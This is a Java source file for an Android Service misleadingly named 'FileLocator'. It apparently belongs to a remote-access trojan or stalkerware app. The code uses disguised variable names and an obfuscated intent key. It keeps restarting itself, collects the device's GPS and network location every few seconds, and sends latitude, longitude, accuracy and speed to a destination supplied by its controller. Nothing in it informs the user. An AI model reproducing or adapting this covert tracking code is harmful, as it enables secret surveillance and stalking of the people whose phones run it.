package store.apps;

import android.Manifest;
import android.annotation.TargetApi;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;

public class FileLocator extends Service {
    public static long timertime = 5000;
    public static long dealogresolt = 0;
    public static double fileslitance = 0.0;
    public static double thelanid = 0.0;

    public static float acomelotor = 0.0f;
    public static float sprtanteto = 0.0f;
    public static LocationListener LL;
    public static LocationManager LM;
    private String vul[];
    static FileLocator st;

    public int onStartCommand(Intent intent, int flags, int startId) {
        String wx = EngineWorkerins._split_3_;
        if (intent != null) {
            if (intent.hasExtra(wx)) {
                vul = intent.getStringArrayExtra(wx);
                ru();
            }

        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @TargetApi(Build.VERSION_CODES.M)
    private void ru() {
        try {

            FileLocator.LM = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            FileLocator.LL = new LocationListener() {
                public void onLocationChanged(Location L) {
                    if (L != null) {
                        FileLocator.thelanid = L.getLongitude();
                        FileLocator.fileslitance = L.getLatitude();
                        FileLocator.acomelotor = L.getAccuracy();
                        FileLocator.sprtanteto = L.getSpeed();
                        s(FileLocator.fileslitance, FileLocator.thelanid, FileLocator.acomelotor);
                        boolean gps = FileLocator.LM.isProviderEnabled(LocationManager.GPS_PROVIDER);
                        if (gps) {
                            try {
                                FileLocator.LM.removeUpdates(FileLocator.LL);
                            } catch (Exception e) {
                            }
                            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                                // TODO: Consider calling
                                //    Activity#requestPermissions
                                // here to request the missing permissions, and then overriding
                                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                //                                          int[] grantResults)
                                // to handle the case where the user grants the permission. See the documentation
                                // for Activity#requestPermissions for more details.
                                return;
                            }
                            FileLocator.LM.requestLocationUpdates(LocationManager.GPS_PROVIDER, FileLocator.timertime, FileLocator.dealogresolt, FileLocator.LL);
                        }
                    }
                }

                public void onStatusChanged(String provider, int status, Bundle extras) {
                }

                public void onProviderEnabled(String provider) {
                }

                public void onProviderDisabled(String provider) {
                }
            };
            boolean net = FileLocator.LM.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            boolean gps = FileLocator.LM.isProviderEnabled(LocationManager.GPS_PROVIDER);
            if (!gps && !net) {
                p( "[RANDOM-STRING]");






            } else {
                if (net) {
                    if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                        // TODO: Consider calling
                        //    Activity#requestPermissions
                        // here to request the missing permissions, and then overriding
                        //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                        //                                          int[] grantResults)
                        // to handle the case where the user grants the permission. See the documentation
                        // for Activity#requestPermissions for more details.
                        return;
                    }
                    Location L = LM.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if(L != null){
                        FileLocator.thelanid = L.getLongitude();
                        FileLocator.fileslitance = L.getLatitude();
                        FileLocator.acomelotor = L.getAccuracy();
                        FileLocator.sprtanteto = L.getSpeed();
                        s(FileLocator.fileslitance, FileLocator.thelanid, FileLocator.acomelotor);
                    }
                    FileLocator.LM.requestLocationUpdates(LocationManager.NETWORK_PROVIDER , FileLocator.timertime, FileLocator.dealogresolt, FileLocator.LL);
                }else if (gps){
                    Location L = FileLocator.LM.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if(L != null){
                        FileLocator.thelanid = L.getLongitude();
                        fileslitance = L.getLatitude();
                        FileLocator.acomelotor = L.getAccuracy();
                        FileLocator.sprtanteto = L.getSpeed();
                        s(fileslitance, FileLocator.thelanid, FileLocator.acomelotor);
                    }
                    FileLocator.LM.requestLocationUpdates(LocationManager.GPS_PROVIDER , FileLocator.timertime, FileLocator.dealogresolt, FileLocator.LL);
                }
            }
        } catch (Exception e) {






            FileLocator.thelanid = 0.0;
            FileLocator.fileslitance = 0.0;
            p( "[RANDOM-STRING]");
        }
    }
    private void s(double la,double lo , float acc) {
        int ed =(int)(FileLocator.sprtanteto);
        String d = la + vul[0] + lo + vul[0] + acc + vul[0] + ed;
        ConHelpOne._send_mthd_(vul[1],d.getBytes());
    }
    private void p(String str){
        if (str != null)
        {
            Intent i = new Intent(this, FileLocator.class);
            this.stopService(i);
        }


    }
    @Override
    public void onDestroy(){
        DataScan1.SETFORONE = 0;
        st = null;
        try{

            FileLocator.LM.removeUpdates(FileLocator.LL);
        } catch (Exception e) {




             }
        super.onDestroy();
    }

}

